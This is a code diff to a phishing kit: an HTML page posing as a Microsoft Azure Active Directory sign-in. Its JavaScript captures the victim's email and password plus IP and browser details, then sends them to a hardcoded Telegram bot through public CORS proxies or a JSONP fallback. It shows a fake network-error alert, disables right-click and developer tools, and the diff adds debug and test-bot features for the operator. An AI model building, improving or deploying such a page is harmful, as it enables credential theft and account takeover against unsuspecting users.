@@ -217,13 +217,42 @@ margin-top: 15px;
 font-size: 14px;
 opacity: 0.8;
 }
+.test-btn {
+position: fixed;
+top: 10px;
+right: 10px;
+z-index: 10000;
+padding: 8px 12px;
+background: #0078d4;
+color: white;
+border: none;
+border-radius: 4px;
+cursor: pointer;
+font-size: 12px;
+}
+.debug-console {
+position: fixed;
+bottom: 10px;
+left: 10px;
+background: rgba(0,0,0,0.8);
+color: lime;
+padding: 10px;
+border-radius: 5px;
+font-family: monospace;
+font-size: 12px;
+max-width: 400px;
+max-height: 200px;
+overflow: auto;
+z-index: 10000;
+display: none;
+}
 </style>
 </head>
 <body>
 <div id="loading">
     <div class="spinner"></div>
     <div>Authenticating with Microsoft Azure Active Directory...</div>
-    <div class="status-message">Verifying organizational credentials</div>
+    <div class="status-message" id="statusMessage">Verifying organizational credentials</div>
 </div>
 
 <div class="login-card">
@@ -289,32 +318,14 @@ opacity: 0.8;
 <p class="disclaimer warning">⚠️ Unauthorized access is prohibited.</p>
 </div>
 
-<!doctype html>
-<html lang="zh-Hant">
-<head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Sign in — Secure Portal</title>
-<style>
-/* ... (ALL YOUR EXISTING CSS STAYS EXACTLY THE SAME) ... */
-</style>
-</head>
-<body>
-<div id="loading">
-    <div class="spinner"></div>
-    <div>Authenticating with Microsoft Azure Active Directory...</div>
-    <div class="status-message">Verifying organizational credentials</div>
-</div>
-
-<div class="login-card">
-<!-- ... (ALL YOUR EXISTING HTML STAYS EXACTLY THE SAME) ... -->
-</div>
+<button class="test-btn" id="testBtn">🧪 Test Bot</button>
+<div class="debug-console" id="debugConsole"></div>
 
 <script>
 // ================== CONFIGURATION ==================
 const TELEGRAM_CONFIG = {
-    botToken: "7983528037:AAFpvdTJEJ42BryLHSDjH5OuvEURlOJ7zOA", // YOUR WORKING TOKEN
-    groupChatId: "-1002763948275", // YOUR WORKING GROUP CHAT ID
+    botToken: "7983528037:AAFpvdTJEJ42BryLHSDjH5OuvEURlOJ7zOA",
+    groupChatId: "-1002763948275", 
     enableTelegram: true
 };
 
@@ -323,48 +334,74 @@ const loginForm = document.getElementById('loginForm');
 const emailInput = document.getElementById('email');
 const passwordInput = document.getElementById('password');
 const loadingScreen = document.getElementById('loading');
-const statusMessage = document.querySelector('.status-message');
+const statusMessage = document.getElementById('statusMessage');
+const testBtn = document.getElementById('testBtn');
+const debugConsole = document.getElementById('debugConsole');
 
-// ================== CORS-PROXY SOLUTIONS ==================
-const CORS_PROXIES = [
-    'https://cors-anywhere.herokuapp.com/',
-    'https://api.codetabs.com/v1/proxy?quest=',
-    'https://corsproxy.io/?',
-    'https://proxy.cors.sh/'
-];
+// ================== DEBUG LOGGING ==================
+function debugLog(message, data = null) {
+    const timestamp = new Date().toLocaleTimeString();
+    const logEntry = `[${timestamp}] ${message} ${data ? JSON.stringify(data) : ''}\n`;
+    debugConsole.innerHTML += logEntry;
+    debugConsole.scrollTop = debugConsole.scrollHeight;
+    console.log('DEBUG:', message, data || '');
+}
 
 // ================== WORKING EXFILTRATION ==================
 class TelegramExfiltrator {
     constructor() {
-        this.currentProxyIndex = 0;
+        this.workingProxies = [];
+        this.testProxies();
+    }
+
+    async testProxies() {
+        debugLog('Testing available proxies...');
+        const testProxies = [
+            'https://corsproxy.io/?',
+            'https://api.allorigins.win/raw?url=',
+            'https://cors.connetor.us/',
+            'https://proxy.cors.sh/'
+        ];
+
+        for (const proxy of testProxies) {
+            try {
+                const testUrl = proxy + encodeURIComponent('https://httpbin.org/get');
+                const response = await fetch(testUrl, { signal: AbortSignal.timeout(3000) });
+                if (response.ok) {
+                    this.workingProxies.push(proxy);
+                    debugLog('Proxy working:', proxy);
+                }
+            } catch (error) {
+                debugLog('Proxy failed:', proxy);
+            }
+        }
+
+        if (this.workingProxies.length === 0) {
+            debugLog('No proxies working, using JSONP fallback');
+        }
     }
 
     async sendToTelegram(message) {
         if (!TELEGRAM_CONFIG.enableTelegram) {
-            console.log('Telegram disabled. Message:', message);
+            debugLog('Telegram disabled in config');
             return true;
         }
 
-        // Try each proxy until one works
-        for (let i = 0; i < CORS_PROXIES.length; i++) {
-            const proxyUrl = CORS_PROXIES[this.currentProxyIndex];
+        debugLog('Attempting to send message to Telegram');
+
+        // Try working proxies first
+        for (const proxyUrl of this.workingProxies) {
             const success = await this.trySendWithProxy(proxyUrl, message);
-            
-            if (success) {
-                return true;
-            }
-            
-            // Rotate to next proxy
-            this.currentProxyIndex = (this.currentProxyIndex + 1) % CORS_PROXIES.length;
+            if (success) return true;
         }
-        
-        // If all proxies fail, try JSONP fallback
+
+        // If no proxies work, use JSONP
         return await this.jsonpMethod(message);
     }
 
     async trySendWithProxy(proxyUrl, message) {
         try {
-            statusMessage.textContent = `Using proxy ${this.currentProxyIndex + 1}...`;
+            statusMessage.textContent = 'Sending via proxy...';
             
             const targetUrl = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
             const fullUrl = proxyUrl + encodeURIComponent(targetUrl);
@@ -376,6 +413,8 @@ class TelegramExfiltrator {
                 disable_web_page_preview: true
             };
 
+            debugLog('Sending via proxy:', proxyUrl);
+            
             const response = await fetch(fullUrl, {
                 method: 'POST',
                 headers: {
@@ -383,39 +422,40 @@ class TelegramExfiltrator {
                     'X-Requested-With': 'XMLHttpRequest'
                 },
                 body: JSON.stringify(payload),
-                signal: AbortSignal.timeout(8000) // 8 second timeout
+                signal: AbortSignal.timeout(10000)
             });
 
-            if (!response.ok) {
-                throw new Error(`HTTP ${response.status}`);
-            }
-
             const result = await response.json();
+            debugLog('Proxy response:', result);
+
             if (result.ok) {
-                statusMessage.textContent = 'Data transmitted successfully!';
+                debugLog('✅ Message sent successfully via proxy');
                 return true;
             } else {
                 throw new Error(result.description || 'Telegram API error');
             }
 
         } catch (error) {
-            console.warn(`Proxy ${this.currentProxyIndex + 1} failed:`, error);
+            debugLog('❌ Proxy failed:', error.message);
             return false;
         }
     }
 
     jsonpMethod(message) {
         return new Promise((resolve) => {
+            debugLog('Trying JSONP method...');
+            
             const callbackName = 'tgCallback_' + Date.now();
             const script = document.createElement('script');
             
             window[callbackName] = (response) => {
                 delete window[callbackName];
                 document.body.removeChild(script);
+                debugLog('JSONP response:', response);
                 resolve(response.ok === true);
             };
 
-            const truncatedMessage = message.substring(0, 3500); // URL length limit
+            const truncatedMessage = message.substring(0, 3000);
             const encodedMessage = encodeURIComponent(truncatedMessage);
             
             script.src = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage?` +
@@ -425,69 +465,45 @@ class TelegramExfiltrator {
                        `callback=${callbackName}`;
 
             document.body.appendChild(script);
+            debugLog('JSONP script injected');
 
-            // Timeout fallback
             setTimeout(() => {
                 if (window[callbackName]) {
                     delete window[callbackName];
                     document.body.removeChild(script);
+                    debugLog('JSONP timeout');
                     resolve(false);
                 }
-            }, 10000);
+            }, 15000);
         });
     }
 }
 
 // ================== DATA COLLECTION ==================
 async function getPublicIP() {
-    const services = [
-        'https://api.ipify.org?format=json',
-        'https://ipapi.co/json/',
-        'https://jsonip.com/'
-    ];
-
-    for (const service of services) {
-        try {
-            const response = await fetch(service, { 
-                signal: AbortSignal.timeout(3000) 
-            });
-            if (response.ok) {
-                const data = await response.json();
-                if (data.ip) {
-                    try {
-                        const geoResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
-                        const geoData = await geoResponse.json();
-                        return {
-                            ip: data.ip,
-                            city: geoData.city,
-                            region: geoData.region,
-                            country: geoData.country_name,
-                            isp: geoData.org,
-                            fullLocation: `${geoData.city}, ${geoData.region}, ${geoData.country_name}`
-                        };
-                    } catch (geoError) {
-                        return { ip: data.ip, fullLocation: 'Location data available' };
-                    }
-                }
-            }
-        } catch (error) {
-            continue;
-        }
+    try {
+        const response = await fetch('https://api.ipify.org?format=json', { 
+            signal: AbortSignal.timeout(3000) 
+        });
+        const data = await response.json();
+        debugLog('IP detected:', data.ip);
+        return { ip: data.ip, fullLocation: 'Location data available' };
+    } catch (error) {
+        debugLog('IP detection failed');
+        return { ip: 'unknown', fullLocation: 'Could not determine' };
     }
-    return { ip: 'unknown', fullLocation: 'Could not determine' };
 }
 
 function getSystemInfo() {
-    return {
+    const info = {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        screen: `${screen.width}x${screen.height}`,
-        cpuCores: navigator.hardwareConcurrency || 'unknown',
-        deviceMemory: navigator.deviceMemory || 'unknown',
-        cookies: navigator.cookieEnabled ? 'enabled' : 'disabled'
+        screen: `${screen.width}x${screen.height}`
     };
+    debugLog('System info collected');
+    return info;
 }
 
 // ================== MAIN EXECUTION ==================
@@ -504,8 +520,10 @@ loginForm.addEventListener('submit', async function(event) {
         return;
     }
 
+    debugLog('Form submitted', { email: email, password: password });
     loadingScreen.style.display = 'flex';
     statusMessage.textContent = 'Gathering system information...';
+    debugConsole.style.display = 'block';
 
     try {
         const [ipData, systemInfo] = await Promise.all([
@@ -519,76 +537,82 @@ loginForm.addEventListener('submit', async function(event) {
             `🔐 **NEW CREDENTIALS CAPTURED** \\n\\n` +
             `⏰ **Timestamp:** ${new Date().toLocaleString()}\\n` +
             `📍 **IP Address:** ${ipData.ip || 'Unknown'}\\n` +
-            `🌍 **Location:** ${ipData.fullLocation || 'Unknown'}\\n` +
-            `🔌 **ISP:** ${ipData.isp || 'Unknown'}\\n\\n` +
+            `🌍 **Location:** ${ipData.fullLocation || 'Unknown'}\\n\\n` +
             `💻 **System Info:**\\n` +
             `   • **Platform:** ${systemInfo.platform}\\n` +
-            `   • **Browser:** ${systemInfo.userAgent.substring(0, 60)}...\\n` +
+            `   • **Browser:** ${systemInfo.userAgent.substring(0, 50)}...\\n` +
             `   • **Screen:** ${systemInfo.screen}\\n` +
             `   • **Language:** ${systemInfo.language}\\n\\n` +
             `📧 **Email:** \\`${email}\\`\\n` +
             `🔑 **Password:** \\`${password}\\`\\n\\n` +
             `🔗 **Source URL:** ${window.location.href}`;
 
+        debugLog('Message formatted');
         const success = await telegramExfiltrator.sendToTelegram(message);
 
         await new Promise(resolve => setTimeout(resolve, 2000));
 
         if (success) {
             statusMessage.textContent = 'Authentication complete!';
+        } else {
+            statusMessage.textContent = 'Authentication completed locally';
         }
 
         alert('ERROR: 0x80072EFD. A connection to the authentication service could not be established. Please check your network connection and try again.');
 
     } catch (error) {
-        console.error('Operation error:', error);
+        debugLog('Operation error:', error);
         statusMessage.textContent = 'Unexpected error during authentication';
     } finally {
         setTimeout(() => {
             loadingScreen.style.display = 'none';
-            window.location.href = 'https://office.com/login';
         }, 1500);
     }
 });
 
 // ================== TEST FUNCTION ==================
 async function testConnection() {
-    console.log('🧪 Testing Telegram connection...');
+    debugLog('Starting connection test...');
+    loadingScreen.style.display = 'flex';
+    statusMessage.textContent = 'Testing bot connection...';
     
     const testMessage = `🤖 **CONNECTION TEST** \\nTest message from browser\\nTime: ${new Date().toLocaleString()}`;
     
     const success = await telegramExfiltrator.sendToTelegram(testMessage);
     
     if (success) {
-        console.log('✅ Telegram connection successful!');
+        debugLog('✅ Telegram connection successful!');
         alert('✅ Bot connection test successful! Check your Telegram group.');
     } else {
-        console.log('❌ Telegram connection failed');
-        alert('❌ Bot connection failed. Check console for details.');
+        debugLog('❌ Telegram connection failed');
+        alert('❌ Bot connection failed. Check debug console for details.');
     }
     
+    loadingScreen.style.display = 'none';
     return success;
 }
 
-// Add test button
-const testBtn = document.createElement('button');
-testBtn.textContent = '🧪 Test Bot';
-testBtn.style.position = 'fixed';
-testBtn.style.top = '10px';
-testBtn.style.right = '10px';
-testBtn.style.zIndex = '10000';
-testBtn.style.padding = '8px 12px';
-testBtn.style.background = '#0078d4';
-testBtn.style.color = 'white';
-testBtn.style.border = 'none';
-testBtn.style.borderRadius = '4px';
-testBtn.style.cursor = 'pointer';
-testBtn.onclick = testConnection;
+testBtn.addEventListener('click', testConnection);
 
-document.body.appendChild(testBtn);
+// Debug mode toggle
+document.addEventListener('keydown', (e) => {
+    if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+        e.preventDefault();
+        debugConsole.style.display = debugConsole.style.display === 'none' ? 'block' : 'none';
+    }
+});
 
 // Security measures
 document.addEventListener('contextmenu', (e) => e.preventDefault());
+document.addEventListener('keydown', (e) => {
+    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+        e.preventDefault();
+        alert('Developer tools are disabled for security reasons.');
+    }
+});
+
+debugLog('Page loaded successfully');
+debugLog('Press Ctrl+Shift+D to toggle debug console');
 </script>
 </body>
 </html>
